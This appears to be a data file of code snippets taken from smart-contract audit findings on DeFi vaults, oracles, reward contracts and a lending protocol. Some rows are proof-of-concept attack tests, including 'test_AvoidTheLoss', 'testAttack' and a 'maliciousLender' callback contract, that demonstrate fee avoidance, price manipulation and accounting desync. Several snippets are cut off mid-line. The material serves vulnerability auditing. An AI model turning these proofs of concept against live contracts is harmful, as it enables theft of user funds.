"```\nforge test --match-path test/vault/LMPVault-Withdraw.t.sol --match-test test_AvoidTheLoss -vv\n```\n```\nfunction test_AvoidTheLoss() public {\n    _accessController.grantRole(Roles.SOLVER_ROLE, address(this));\n    _accessController.grantRole(Roles.LMP_FEE_SETTER_ROLE, address(this));\n\n    address feeSink = vm.addr(555);\n    _lmpVault.setFeeSink(feeSink);\n    _lmpVault.setPerformanceFeeBps(2000); // 20%\n\n    address alice = address(789);\n    uint initialBalanceAlice = 1000;\n    _asset.mint(address(this), 1000);\n    _asset.approve(address(_lmpVault), 1000);\n    uint shareBalUser = _lmpVault.deposit(1000, address(this));\n\n    _underlyerOne.mint(address(this), 500);\n    _underlyerOne.approve(address(_lmpVault), 500);\n    _lmpVault.rebalance(\n        address(_destVaultOne),\n        address(_underlyerOne),\n        500,\n        address(0),\n        address(_asset),\n        1000\n    );\n\n    _asset.mint(alice, initialBalanceAlice);\n    vm.startPrank(alice);\n    _asset.approve(address(_lmpVault), initialBalanceAlice);\n    uint shareBalAlice = _lmpVault.deposit(initialBalanceAlice, alice);\n    vm.stopPrank();\n\n    _underlyerTwo.mint(address(this), 1000);\n    _underlyerTwo.approve(address(_lmpVault), 1000);\n    _lmpVault.rebalance(\n        address(_destVaultTwo),\n        address(_underlyerTwo),\n        1000,\n        address(0),\n        address(_asset),\n        1000\n    );\n\n    _mockRootPrice(address(_underlyerTwo), 0.9 ether);\n    _mockRootPrice(address(_underlyerOne), 2.1 ether);\n\n    address[] memory alteredDestinations = new address[](1);\n    alteredDestinations[0] = address(_destVaultOne);\n    vm.prank(alice);\n    _lmpVault.updateDebtReporting(alteredDestinations);\n\n    vm.prank(alice);\n    _lmpVault.redeem(shareBalAlice, alice, alice);\n    uint finalBalanceAlice = _asset.balanceOf(alice);\n    emit log_named_uint(""final Balance of alice"", finalBalanceAlice);\n\n    emit log_named_uint(""Fees shares give to feeSink"", _l"
"```\naveragePrice = existing._initAcc * 1e18 / INIT_SAMPLE_COUNT\naveragePrice = 36e18 * 1e18 / 18\naveragePrice = 36e36 / 18\naveragePrice = 2e36\n```\n```\nexisting.slowFilterPrice = Stats.getFilteredValue(SLOW_ALPHA, existing.slowFilterPrice, price)\nexisting.fastFilterPrice = Stats.getFilteredValue(FAST_ALPHA, existing.fastFilterPrice, price)\n\nexisting.slowFilterPrice = Stats.getFilteredValue(SLOW_ALPHA, 2e36, 3e18)\nexisting.fastFilterPrice = Stats.getFilteredValue(FAST_ALPHA, 2e36, 3e18)\n```\n```\n((priorValue * (1e18 - alpha) + (currentValue * alpha)) / 1e18)\n((priorValue * (1e18 - 33e16) + (currentValue * 33e16)) / 1e18)\n((priorValue * 67e16) + (currentValue * 33e16)) / 1e18\n((2e36 * 67e16) + (3e18 * 33e16)) / 1e18\n1.34e36  # 1340000000000000000 ETH\n```\n```\nfunction updatePricingInfo(IRootPriceOracle pricer, address token) internal {\n    uint256 price = pricer.getPriceInEth(token);\n\n    // update the timestamp no matter what phase we're in\n    existing.lastSnapshot = uint40(block.timestamp);\n\n    if (existing._initComplete) {\n        // post-init phase, just update the filter values\n        existing.slowFilterPrice = Stats.getFilteredValue(SLOW_ALPHA, existing.slowFilterPrice, price);\n        existing.fastFilterPrice = Stats.getFilteredValue(FAST_ALPHA, existing.fastFilterPrice, price);\n    } else {\n        // still the initialization phase\n        existing._initCount += 1;\n        existing._initAcc += price;\n\n        if (existing._initCount == INIT_SAMPLE_COUNT) {\n            // if this sample hits the target number, then complete initialize and set the filters\n            existing._initComplete = true;\n            uint256 averagePrice = existing._initAcc * 1e18 / INIT_SAMPLE_COUNT;\n            existing.fastFilterPrice = averagePrice;\n            existing.slowFilterPrice = averagePrice;\n        }\n    }\n```"
"```\nfunction _mint(address account, uint256 amount) internal virtual {\n    _beforeTokenTransfer(address(0), account, amount);\n\n    _totalSupply += amount;\n    unchecked {\n        _balances[account] += amount;\n    }\n    _afterTokenTransfer(address(0), account, amount);\n}\n```\n```\nfunction _afterTokenTransfer(address from, address to, uint256 amount) internal virtual override {\n    if (to!= address(0)) {\n        rewarder.stake(to, amount);\n    }\n}\n```\n```\nfunction stake(address account, uint256 amount) public onlyStakeTracker {\n    _updateReward(account);\n    _stake(account, amount);\n\n    for (uint256 i = 0; i < extraRewards.length; i++) {\n        IExtraRewarder(extraRewards[i]).stake(account, amount);\n    }\n}\n```\n```\nfunction _updateReward(address account) internal {\n    uint256 earnedRewards = 0;\n    rewardPerTokenStored = rewardPerToken();\n    lastUpdateBlock = lastBlockRewardApplicable();\n\n    if (account!= address(0)) {\n        earnedRewards = earned(account);\n        rewards[account] = earnedRewards;\n        userRewardPerTokenPaid[account] = rewardPerTokenStored;\n    }\n\n    emit UserRewardUpdated(account, earnedRewards, rewardPerTokenStored, lastUpdateBlock);\n}\n\nfunction balanceOf(address account) public view returns (uint256) {\n    return stakeTracker.balanceOf(account);\n}\n\nfunction earned(address account) public view returns (uint256) {\n    return (balanceOf(account) * (rewardPerToken() - userRewardPerTokenPaid[account]) / 1e18) + rewards[account];\n}\n```"
```\nfunction totalAssets() public view override returns (uint256) {\n    return totalIdle + totalDebt;\n}\n```
"```\ndef lp_price() -> uint256:\n    """"""\n    Approximate LP token price\n    """"""\n    return 2 * self.virtual_price * self.sqrt_int(self.internal_price_oracle()) / 10**18\n```\n```\ndef price_oracle() -> uint256:\n    return self.internal_price_oracle()\n```\n```\nfunction registerPool(address curvePool, address curveLpToken, bool checkReentrancy) external onlyOwner {\n    /**\n     * Curve V2 pools always price second token in `coins` array in first token in `coins` array. \n     * This means that if `coins[0]` is Weth, and `coins[1]` is rEth, the price will be rEth as base and weth as quote. \n     * Hence to get lp price we will always want to use the second token in the array, priced in eth.\n     */\n    lpTokenToPool[lpToken] = \n        PoolData({ pool: curvePool, checkReentrancy: checkReentrancy? 1 : 0, tokenToPrice: tokens[1] });\n```\n```\nfunction getPriceInEth(address token) external returns (uint256 price) {\n    Errors.verifyNotZero(token, ""token"");\n\n    PoolData memory poolInfo = lpTokenToPool[token];\n    if (poolInfo.pool == address(0)) revert NotRegistered(token);\n\n    ICryptoSwapPool cryptoPool = ICryptoSwapPool(poolInfo.pool);\n\n    if (poolInfo.checkReentrancy == 1) {\n        cryptoPool.claim_admin_fees();\n    }\n\n    uint256 virtualPrice = cryptoPool.get_virtual_price();\n    uint256 assetPrice = systemRegistry.rootPriceOracle().getPriceInEth(poolInfo.tokenToPrice);\n\n    return (2 * virtualPrice * sqrt(assetPrice)) / 10**18;\n}"
"```\nFile: LMPVault.sol\n\ndef calculateFees():\n    profit = (currentNavPerShare - effectiveNavPerShareHighMark) * totalSupply\n    fees = profit.mulDiv(performanceFeeBps, (MAX_FEE_BPS ** 2), Math.Rounding.Up)\n    if fees > 0 and sink!= address(0):\n        shares = _convertToShares(fees, Math.Rounding.Up)\n        _mint(sink, shares)\n        emit Deposit(address(this), sink, fees, shares)\n```"
"```\n(uint256 reserveTokenA, uint256 reserveTokenB) = boostedPosition.getReserves();\n\nuint256 boostedPositionTotalSupply = boostedPosition.totalSupply();\n\nIRootPriceOracle rootPriceOracle = systemRegistry.rootPriceOracle();\n\nuint256 priceInEthTokenA = rootPriceOracle.getPriceInEth(address(pool.tokenA()));\nuint256 priceInEthTokenB = rootPriceOracle.getPriceInEth(address(pool.tokenB()));\n\nuint256 totalBoostedPositionValueTokenA = reserveTokenA * priceInEthTokenA;\nuint256 totalBoostedPositionValueTokenB = reserveTokenB * priceInEthTokenB;\n\nreturn (totalBoostedPositionValueTokenA + totalBoostedPositionValueTokenB) / boostedPositionTotalSupply;\n```"
"```\nfunction getReward(address _account, bool _claimExtras) public updateReward(_account) returns(bool) {\n    uint256 reward = earned(_account);\n    if (reward > 0) {\n        rewards[_account] = 0;\n        rewardToken.safeTransfer(_account, reward);\n        IDeposit(operator).rewardClaimed(pid, _account, reward);\n        emit RewardPaid(_account, reward);\n    }\n\n    if (_claimExtras) {\n        for (uint i = 0; i < extraRewards.length; i++) {\n            IRewards(extraRewards[i]).getReward(_account);\n        }\n    }\n    return true;\n}\n```\n```\nfunction _claimRewards(\n    address gauge,\n    address defaultToken,\n    address sendTo\n) internal returns (uint256[] memory amounts, address[] memory tokens) {\n    uint256[] memory balancesBefore = new uint256[](totalLength);\n    uint256[] memory amountsClaimed = new uint256[](totalLength);\n\n    for (uint256 i = 0; i < totalLength; ++i) {\n        uint256 balance = 0;\n        if (IERC20(rewardTokens[i]).totalSupply() > 0) {\n            balance = IERC20(rewardTokens[i]).balanceOf(account);\n        }\n        amountsClaimed[i] = balance - balancesBefore[i];\n    }\n\n    return (amountsClaimed, rewardTokens);\n}"
"```\nfunction test_revert_underflow() public {\n    _accessController.grantRole(Roles.SOLVER_ROLE, address(this));\n    _accessController.grantRole(Roles.LMP_FEE_SETTER_ROLE, address(this));\n\n    // User is going to deposit 1500 asset\n    _asset.mint(address(this), 1500);\n    _asset.approve(address(_lmpVault), 1500);\n    _lmpVault.deposit(1500, address(this));\n\n    // Deployed 700 asset to DV1\n    _underlyerOne.mint(address(this), 700);\n    _underlyerOne.approve(address(_lmpVault), 700);\n    _lmpVault.rebalance(\n        address(_destVaultOne),\n        address(_underlyerOne), // tokenIn\n        700,\n        address(0), // destinationOut, none when sending out baseAsset\n        address(_asset), // baseAsset, tokenOut\n        700\n    );\n\n    // Deploy 600 asset to DV2\n    _underlyerTwo.mint(address(this), 600);\n    _underlyerTwo.approve(address(_lmpVault), 600);\n    _lmpVault.rebalance(\n        address(_destVaultTwo),\n        address(_underlyerTwo), // tokenIn\n        600,\n        address(0), // destinationOut, none when sending out baseAsset\n        address(_asset), // baseAsset, tokenOut\n        600\n    );\n\n    // Deployed 200 asset to DV3\n    _underlyerThree.mint(address(this), 200);\n    _underlyerThree.approve(address(_lmpVault), 200);\n    _lmpVault.rebalance(\n        address(_destVaultThree),\n        address(_underlyerThree), // tokenIn\n        200,\n        address(0), // destinationOut, none when sending out baseAsset\n        address(_asset), // baseAsset, tokenOut\n        200\n    );\n\n    // Drop the price of DV2 to 70% of original, so that 600 we transferred out is now only worth 420\n    _mockRootPrice(address(_underlyerTwo), 7e17);\n\n    // Revert because of an arithmetic underflow\n    vm.expectRevert();\n    uint256 assets = _lmpVault.redeem(1000, address(this), address(this));\n}\n```"
"```\nfunction _processRewards(address account, bool claimExtras) internal {\n    _getReward(account);\n\n    //also get rewards from linked rewards\n    if (claimExtras) {\n        for (uint256 i = 0; i < extraRewards.length; ++i) {\n            IExtraRewarder(extraRewards[i]).getReward(account);\n        }\n    }\n```\n```\nfunction _getReward(address account) internal {\n    Errors.verifyNotZero(account, ""account"");\n\n    uint256 reward = earned(account);\n    (IGPToke gpToke, address tokeAddress) = (systemRegistry.gpToke(), address(systemRegistry.toke()));\n\n    if (reward == 0) return;\n\n    rewards[account] = 0;\n    emit RewardPaid(account, reward);\n\n    if (rewardToken!= tokeAddress || tokeLockDuration == 0) {\n        IERC20(rewardToken).safeTransfer(account, reward);\n    } else {\n        IERC20(address(tokeAddress)).approve(address(gpToke), reward);\n\n        gpToke.stake(reward, tokeLockDuration, account);\n    }\n}\n```\nuint256 public constant MIN_STAKE_AMOUNT = 10_000;\n\nfunction _stake(uint256 amount, uint256 duration, address to) internal whenNotPaused {\n    //\n    // validation checks\n    //\n\n    if (to == address(0)) revert ZeroAddress();\n    if (amount < MIN_STAKE_AMOUNT) revert StakingAmountInsufficient();\n    if (amount > MAX_STAKE_AMOUNT) revert StakingAmountExceeded();\n```"
```\nfunction getPriceInEth(address token) external view returns (uint256 price) {\n    if (token!= address(swEth)) revert Errors.InvalidToken(token);\n\n    price = swEth.swETHToETHRate();\n}\n```
"```\nfunction redeem(\n    uint256 shares,\n    address receiver,\n    address owner\n) public virtual override nonReentrant noNavDecrease ensureNoNavOps returns (uint256 assets) {\n    uint256 maxShares = maxRedeem(owner);\n    if (shares > maxShares) {\n        revert ERC4626ExceededMaxRedeem(owner, shares, maxShares);\n    }\n    uint256 possibleAssets = previewRedeem(shares); // round down, which is correct because user won't get too many\n    assets = _withdraw(possibleAssets, shares, receiver, owner);\n}\n```\n```\nfunction _withdraw(\n    uint256 assets,\n    uint256 shares,\n    address receiver,\n    address owner\n) internal virtual returns (uint256) {\n    uint256 idle = totalIdle;\n    WithdrawInfo memory info = WithdrawInfo({\n        currentIdle: idle,\n        assetsFromIdle: assets >= idle? idle : assets,\n        totalAssetsToPull: assets - (assets >= idle? idle : assets),\n        totalAssetsPulled: 0,\n        idleIncrease: 0,\n        debtDecrease: 0\n    });\n\n    if (info.totalAssetsToPull > 0) {\n        uint256 totalVaultShares = totalSupply();\n\n        uint256 withdrawalQueueLength = withdrawalQueue.length;\n        for (uint256 i = 0; i < withdrawalQueueLength; ++i) {\n            IDestinationVault destVault = IDestinationVault(withdrawalQueue[i]);\n            (uint256 sharesToBurn, uint256 totalDebtBurn) = _calcUserWithdrawSharesToBurn(\n                destVault,\n                shares,\n                info.totalAssetsToPull - Math.max(info.debtDecrease, info.totalAssetsPulled),\n                totalVaultShares\n            );\n\n            //...SNIP...\n\n        }\n\n        // At this point should have all the funds we need sitting in the vault\n        uint256 returnedAssets = info.assetsFromIdle + info.totalAssetsPulled;\n    }\n}"
"```\nfunction _collectFees(\n    uint256 idle,\n    uint256 debt,\n    uint256 totalSupply\n) internal {\n    address sink = feeSink;\n    uint256 fees = 0;\n    uint256 shares = 0;\n    uint256 profit = 0;\n\n    if (totalSupply == 0) {\n        return;\n    }\n\n    uint256 currentNavPerShare = ((idle + debt) * MAX_FEE_BPS) / totalSupply;\n    uint256 effectiveNavPerShareHighMark = navPerShareHighMark;\n\n    if (currentNavPerShare > effectiveNavPerShareHighMark) {\n        profit = (currentNavPerShare - effectiveNavPerShareHighMark) * totalSupply;\n        fees = profit.mulDiv(performanceFeeBps, (MAX_FEE_BPS ** 2), Math.Rounding.Up);\n        if (fees > 0 && sink!= address(0)) {\n            shares = _convertToShares(fees, Math.Rounding.Up);\n            _mint(sink, shares);\n            emit Deposit(address(this), sink, fees, shares);\n        }\n        navPerShareHighMark = currentNavPerShare;\n        navPerShareHighMarkTimestamp = block.timestamp;\n        emit NewNavHighWatermark(currentNavPerShare, block.timestamp);\n    }\n    emit FeeCollected(fees, sink, shares, profit, idle, debt);\n}\n```"
"```\nfunction getPriceInEth(address tokenToPrice) external returns (uint256) {\n    TellorInfo memory tellorInfo = _getQueryInfo(tokenToPrice);\n    uint256 timestamp = block.timestamp;\n\n    (bytes memory value, uint256 timestampRetrieved) = getDataBefore(tellorInfo.queryId, timestamp - 30 minutes);\n\n    uint256 tellorStoredTimeout = uint256(tellorInfo.pricingTimeout);\n    uint256 tokenPricingTimeout = tellorStoredTimeout == 0? DEFAULT_PRICING_TIMEOUT : tellorStoredTimeout;\n\n    if (timestampRetrieved == 0 || timestamp - timestampRetrieved > tokenPricingTimeout) {\n        revert InvalidDataReturned();\n    }\n\n    uint256 price = abi.decode(value, (uint256));\n    return _denominationPricing(tellorInfo.denomination, price, tokenToPrice);\n}\n```"
"```\nfunction _claimRewards(\n    address gauge,\n    address defaultToken,\n    address sendTo\n) internal returns (uint256[] memory amounts, address[] memory tokens) {\n    // Record balances before claiming\n    for (uint256 i = 0; i < totalLength; ++i) {\n        if (IERC20(rewardTokens[i]).totalSupply() > 0) {\n            balancesBefore[i] = IERC20(rewardTokens[i]).balanceOf(account);\n        }\n    }\n\n    // Claim rewards\n    bool result = rewardPool.getReward(account, /*_claimExtras*/ true);\n    if (!result) {\n        revert RewardAdapter.ClaimRewardsFailed();\n    }\n\n    // Record balances after claiming and calculate amounts claimed\n    for (uint256 i = 0; i < totalLength; ++i) {\n        uint256 balance = 0;\n        if (IERC20(rewardTokens[i]).totalSupply() > 0) {\n            balance = IERC20(rewardTokens[i]).balanceOf(account);\n        }\n\n        amountsClaimed[i] = balance - balancesBefore[i];\n\n        if (sendTo!= address(this) && amountsClaimed[i] > 0) {\n            IERC20(rewardTokens[i]).safeTransfer(sendTo, amountsClaimed[i]);\n        }\n    }\n\n    RewardAdapter.emitRewardsClaimed(rewardTokens, amountsClaimed);\n\n    return (amountsClaimed, rewardTokens);\n}"
"```\nfunction _collectFees(uint256 idle, uint256 debt, uint256 totalSupply) internal {\n    address sink = feeSink;\n    uint256 fees = 0;\n    uint256 shares = 0;\n    uint256 profit = 0;\n\n    if (totalSupply == 0) {\n        return;\n    }\n\n    uint256 currentNavPerShare = ((idle + debt) * MAX_FEE_BPS) / totalSupply;\n    uint256 effectiveNavPerShareHighMark = navPerShareHighMark;\n\n    if (currentNavPerShare > effectiveNavPerShareHighMark) {\n        profit = (currentNavPerShare - effectiveNavPerShareHighMark) * totalSupply;\n    }\n```"
"```\nfunction removeVault(address vaultAddress) external onlyUpdater {\n    Errors.verifyNotZero(vaultAddress, ""vaultAddress"");\n\n    if (!_vaults.remove(vaultAddress)) {\n        revert VaultNotFound(vaultAddress);\n    }\n\n    address asset = ILMPVault(vaultAddress).asset();\n\n    if (_vaultsByAsset[asset].length() == 1) {\n        _assets.remove(asset);\n    }\n\n    if (!_vaultsByAsset[asset].remove(vaultAddress)) {\n        revert VaultNotFound(vaultAddress);\n    }\n\n    emit VaultRemoved(asset, vaultAddress);\n}\n```\n```\nif (!_vaultsByType[vaultType].add(vaultAddress)) {\n    revert VaultAlreadyExists(vaultAddress);\n}\n```"
"```\nL292    totalDebtBurn = cachedCurrentDebt.mulDiv(sharesToBurn, cachedDvShares, Math.RoundUp);\n\nL440    uint256 currentDebt = (destInfo.currentDebt * originalShares) / Math.max(destInfo.ownedShares, 1);\nL448    totalDebtDecrease = currentDebt;\n```\n```\nif (currentDvDebtValue < updatedDebtBasis) {\n    currentDvDebtValue = currentDvDebtValue.mulDiv(userShares, totalVaultShares, Math.Rounding.Down);\n    currentDvShares = currentDvShares.mulDiv(userShares, totalVaultShares, Math.Rounding.Down);\n}\n\nif (currentDvDebtValue < maxAssetsToPull) {\n    maxAssetsToPull = currentDvDebtValue;\n}\n\nsharesToBurn = currentDvShares.mulDiv(maxAssetsToPull, currentDvDebtValue, Math.Rounding.Up);\n```"
"```\nfunction _collectFees(uint256 idle, uint256 debt, uint256 totalSupply) internal {\n    address sink = feeSink;\n\n    if (fees > 0 && sink!= address(0)) {\n        shares = _convertToShares(fees, Math.Rounding.Up);\n        _mint(sink, shares);\n        emit Deposit(address(this), sink, fees, shares);\n    }\n}\n```\n```\nfunction _beforeTokenTransfer(\n    address from,\n    address to,\n    uint256 amount\n) internal virtual override whenNotPaused {\n    if (balanceOf(to) + amount > perWalletLimit) {\n        revert OverWalletLimit(to);\n    }\n}\n```"
"```\nfunction flashRebalance(\n    DestinationInfo storage destInfoOut,\n    DestinationInfo storage destInfoIn,\n    IERC3156FlashBorrower receiver,\n    IStrategy.RebalanceParams memory params,\n    FlashRebalanceParams memory flashParams,\n    bytes calldata data\n) external returns (uint256 idle, uint256 debt) {\n    if (params.amountIn > 0) {\n        IDestinationVault dvIn = IDestinationVault(params.destinationIn);\n\n        uint256 tokenInBalanceBefore = IERC20(params.tokenIn).balanceOf(address(this));\n\n        bytes32 flashResult = receiver.onFlashLoan(msg.sender, params.tokenIn, params.amountIn, 0, data);\n\n        uint256 tokenInBalanceAfter = IERC20(params.tokenIn).balanceOf(address(this));\n\n        if (\n            flashResult!= keccak256(""ERC3156FlashBorrower.onFlashLoan"")\n                || tokenInBalanceAfter < tokenInBalanceBefore + params.amountIn\n        ) {\n            revert Errors.FlashLoanFailed(params.tokenIn, params.amountIn);\n        }\n\n        if (params.tokenIn!= address(flashParams.baseAsset)) {\n            (uint256 debtDecreaseIn, uint256 debtIncreaseIn) = _handleRebalanceIn(\n                destInfoIn,\n                dvIn,\n                params.tokenIn,\n                tokenInBalanceAfter - tokenInBalanceBefore\n            );\n            idleDebtChange.debtDecrease += debtDecreaseIn;\n            idleDebtChange.debtIncrease += debtIncreaseIn;\n        } else {\n            idleDebtChange.idleIncrease += tokenInBalanceAfter - tokenInBalanceBefore;\n        }\n    }\n}\n```"
"```\nfunction testAttack() public {\n    mockRootPrice(WSTETH, 1_123_300_000_000_000_000);\n    mockRootPrice(CBETH, 1_034_300_000_000_000_000);\n\n    IBalancerMetaStablePool pool = IBalancerMetaStablePool(WSTETH_CBETH_POOL);\n\n    address[] memory assets = new address[](2);\n    assets[0] = WSTETH;\n    assets[1] = CBETH;\n    uint256[] memory amounts = new uint256[](2);\n    amounts[0] = 10_000 ether;\n    amounts[1] = 0;\n\n    IBalancerVault.JoinPoolRequest memory joinRequest = IBalancerVault.JoinPoolRequest({\n        assets: assets,\n        maxAmountsIn: amounts,\n        userData: abi.encode(\n            IBalancerVault.JoinKind.EXACT_TOKENS_IN_FOR_BPT_OUT,\n            amounts,\n            0\n        ),\n        fromInternalBalance: false\n    });\n\n    IBalancerVault.SingleSwap memory swapRequest = IBalancerVault.SingleSwap({\n        poolId: 0x9c6d47ff73e0f5e51be5fd53236e3f595c5793f200020000000000000000042c,\n        kind: IBalancerVault.SwapKind.GIVEN_IN,\n        assetIn: WSTETH,\n        assetOut: CBETH,\n        amount: amounts[0],\n        userData: abi.encode(\n            IBalancerVault.JoinKind.EXACT_TOKENS_IN_FOR_BPT_OUT,\n            amounts,\n            0\n        )\n    });\n\n    IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({\n        sender: address(this),\n        fromInternalBalance: false,\n        recipient: payable(address(this)),\n        toInternalBalance: false\n    });\n\n    emit log_named_uint(""Gas before price1"", gasleft());\n    uint256 price1 = oracle.getPriceInEth(WSTETH_CBETH_POOL);\n    emit log_named_uint(""price1"", price1);\n    emit log_named_uint(""Gas after price1"", gasleft());\n}\n```\n```\n[PASS] testAttack() (gas: 9203730962297323943)\nLogs:\n    Gas before price1: 9223372036854745204\n    price1: 1006294352158612428\n    Gas after price1: 425625349158468958\n```"
```\nreturn ((priorValue * (1e18 - alpha)) + (currentValue * alpha)) / 1e18;
"```\nCurve Pools\n\nCurve stETH/ETH: 0x06325440D014e39736583c165C2963BA99fAf14E\nCurve stETH/ETH ng: 0x21E27a5E5513D6e65C4f830167390997aA84843a\nCurve stETH/ETH concentrated: 0x828b154032950C8ff7CF8085D841723Db2696056\nCurve stETH/frxETH: 0x4d9f9D15101EEC665F77210cB999639f760F831E\nCurve rETH/ETH: 0x6c38cE8984a890F5e46e6dF6117C26b3F1EcfC9C\nCurve rETH/wstETH: 0x447Ddd4960d9fdBF6af9a790560d0AF76795CB08\nCurve rETH/frxETH: 0xbA6c373992AD8ec1f7520E5878E5540Eb36DeBf1\nCurve cbETH/ETH: 0x5b6C539b224014A09B3388e51CaAA8e354c959C8\nCurve cbETH/frxETH: 0x548E063CE6F3BaC31457E4f5b4e2345286274257\nCurve frxETH/ETH: 0xf43211935C781D5ca1a41d2041F397B8A7366C7A\nCurve swETH/frxETH: 0xe49AdDc2D1A131c6b8145F0EBa1C946B7198e0BA\n```\n```\n@external\ndef withdraw_admin_fees():\n    receiver: address = Factory(self.factory).get_fee_receiver(self)\n\n    amount: uint256 = self.admin_balances[0]\n    if amount!= 0:\n        raw_call(receiver, b"""", value=amount)\n\n    amount = self.admin_balances[1]\n    if amount!= 0:\n        assert ERC20(self.coins[1]).transfer(receiver, amount, default_return_value=True)\n\n    self.admin_balances = [0] * N_COINS\n```\n```\nraw_call(receiver, b"""", value=amount)"
"```\nfunction claimDefaulted(uint256 loanID_) external returns (uint256, uint256, uint256) {\n    Loan memory loan = loans[loanID_];\n    delete loans[loanID_];\n}\n```"
"```\nfunction clearRequest(\n    uint256 reqID_,\n    bool repayDirect_,\n    bool isCallback_\n) external returns (uint256 loanID) {\n    Request memory req = requests[reqID_];\n\n    if (isCallback_ &&!CoolerCallback(msg.sender).isCoolerCallback()) {\n        revert NotCoolerCallback();\n    }\n\n    if (!req.active) {\n        revert Deactivated();\n    }\n\n    req.active = false;\n\n    uint256 interest = interestFor(req.amount, req.interest, req.duration);\n    uint256 collat = collateralFor(req.amount, req.loanToCollateral);\n    uint256 expiration = block.timestamp + req.duration;\n    loanID = loans.length;\n    loans.push(\n        Loan({\n            request: req,\n            amount: req.amount + interest,\n            unclaimed: 0,\n            collateral: collat,\n            expiry: expiration,\n            lender: msg.sender,\n            repayDirect: repayDirect_,\n            callback: isCallback_\n        })\n    );\n\n    requests[reqID_].active = false;\n\n    debt().safeTransferFrom(msg.sender, owner(), req.amount);\n\n    factory().newEvent(reqID_, CoolerFactory.Events.ClearRequest, 0);\n}\n```\n```\ncontract maliciousLender {\n    function isCoolerCallback() public pure returns (bool) {\n        return true;\n    }\n\n    function operation(\n        address _to,\n        uint256 reqID_\n    ) public {\n        Cooler(_to).clearRequest(reqID_, true, true);\n    }\n\n    function onDefault(uint256 loanID_, uint256 debt, uint256 collateral) public {\n    }\n}\n```\n```\nfunction approveTransfer(address to_, uint256 loanID_) external {\n    if (msg.sender!= loans[loanID_].lender) revert OnlyApproved();\n\n    // Update transfer approvals.\n    approvals[loanID_] = to_;\n}\n\nfunction transferOwnership(uint256 loanID_) external {\n    if (msg.sender!= approvals[loanID_]) revert OnlyApproved();\n\n    // Update the loan lender.\n    loans[loanID_].lender = msg.sender;\n    // Clear transfer approvals.\n    approvals[loanID_] = address(0);\n}\n```"
"```\nfunction emergencyShutdown() external onlyRole(""emergency_shutdown"") {\n    active = false;\n\n    uint256 sdaiBalance = sdai.balanceOf(address(this));\n    if (sdaiBalance!= 0) {\n        defund(sdai, sdaiBalance);\n    }\n\n    uint256 daiBalance = dai.balanceOf(address(this));\n    if (daiBalance!= 0) {\n        defund(dai, daiBalance);\n    }\n\n    emit Deactivated();\n}\n```\n```\nfunction defund(ERC20 token_, uint256 amount_) public onlyRole(""cooler_overseer"") {\n```\n```\nrolesAdmin.grantRole(""cooler_overseer"", overseer);\nrolesAdmin.grantRole(""emergency_shutdown"", overseer);\n```\nforge test --match-test test_emergencyShutdown\n```"
"```\nrequestLoan(""1,000 debt tokens"", ""5% interest"", ""10 loan tokens for each collateral"", ""1 year"")\n```\nprovideNewTermsForRoll(""loanID"", ""10000000% interest"", ""1000 loan tokens for each collateral"", ""1 year"")\n```\nfunction interestFor(uint256 amount_, uint256 rate_, uint256 duration_) public pure returns (uint256) {\n    uint256 interest = (rate_ * duration_) / 10000; // 365 days\n    return (amount_ * interest) / DECIMALS_INTEREST;\n}\n```\n```\nfunction newCollateralFor(uint256 loanID_) public view returns (uint256) {\n    Loan memory loan = loans[loanID_];\n\n    uint256 neededCollateral = collateralFor(loan.amount, loan.request.loanToCollateral);\n    // Lender can force neededCollateral to always be less than loan.collateral\n\n    return neededCollateral > loan.collateral? neededCollateral - loan.collateral : 0;\n}\n```"
```\nuint256 minPrice = base.getPrice(tokens[0]);\n\nfor (uint256 i = 1; i!= length; ++i) {\n    uint256 price = base.getPrice(tokens[i]);\n    minPrice = (price < minPrice)? price : minPrice;\n}\n\nreturn minPrice.mulWadDown(pool.getRate());\n```
"```\n(lpPrice(\n    virtualPrice,\n    base.getPrice(tokens[1]),\n    ethPrice,\n    base.getPrice(tokens[0])\n) * 1e18) / ethPrice;\n```"
```\nif (cliff < totalCliffs) {\n    uint256 reduction = ((totalCliffs - cliff) * 5) / 2 + 700;\n    mintAmount = (mintRequestAmount * reduction) / totalCliffs;\n\n    uint256 amtTillMax = emissionMaxSupply - emissionsMinted;\n    if (mintAmount > amtTillMax) {\n        mintAmount = amtTillMax;\n    }\n}
"```\nit('panprog global-local desync', async () => {\n  const positionMaker = parse6decimal('2.000');\n  const positionLong = parse6decimal('1.000');\n  const collateral = parse6decimal('100');\n\n  const oracleVersion = {\n    price: parse6decimal('100'),\n    timestamp: TIMESTAMP,\n    valid: true,\n  };\n  oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion);\n  oracle.status.returns([oracleVersion, oracleVersion.timestamp + 100]);\n  oracle.request.returns();\n\n  dsu.transferFrom.whenCalledWith(userB.address, market.address, collateral.mul(1e12)).returns(true);\n  await market.connect(userB).update(userB.address, positionMaker, 0, 0, collateral, false);\n\n  const oracleVersion2 = {\n    price: parse6decimal('100'),\n    timestamp: TIMESTAMP + 100,\n    valid: true,\n  };\n  oracle.at.whenCalledWith(oracleVersion2.timestamp).returns(oracleVersion2);\n  oracle.status.returns([oracleVersion2, oracleVersion2.timestamp + 100]);\n  oracle.request.returns();\n\n  dsu.transferFrom.whenCalledWith(user.address, market.address, collateral.mul(1e12)).returns(true);\n  await market.connect(user).update(user.address, 0, positionLong, 0, collateral, false);\n\n  const info = await market.locals(userB.address);\n  console.log(""collateral deposit maker: "" + info.collateral);\n  const info = await market.locals(user.address);\n  console.log(""collateral deposit long: "" + info.collateral);\n\n  const oracleVersion3 = {\n    price: 0,\n    timestamp: TIMESTAMP + 200,\n    valid: false,\n  };\n  oracle.at.whenCalledWith(oracleVersion3.timestamp).returns(oracleVersion3);\n\n  const oracleVersion4 = {\n    price: parse6decimal('100'),\n    timestamp: TIMESTAMP + 300,\n    valid: true,\n  };\n  oracle.at.whenCalledWith(oracleVersion4.timestamp).returns(oracleVersion4);\n\n  oracle.status.returns([oracleVersion2, oracleVersion4.timestamp + 100]);\n  oracle.request.returns();\n\n  await market.connect(user).update(user.address, 0, 0, 0, 0, false);\n\n  oracle.status.returns([oracleVersion4, oracleVersion4.timestamp + 100]);\n  oracle.request.returns();\n\n  await market.connect(userB).update(userB\n```\ncollateral_deposit_maker: 100000000\ncollateral_deposit_long: 100000000\ncollateral_maker: 110000028\ncollateral_long: 100000000\n```"
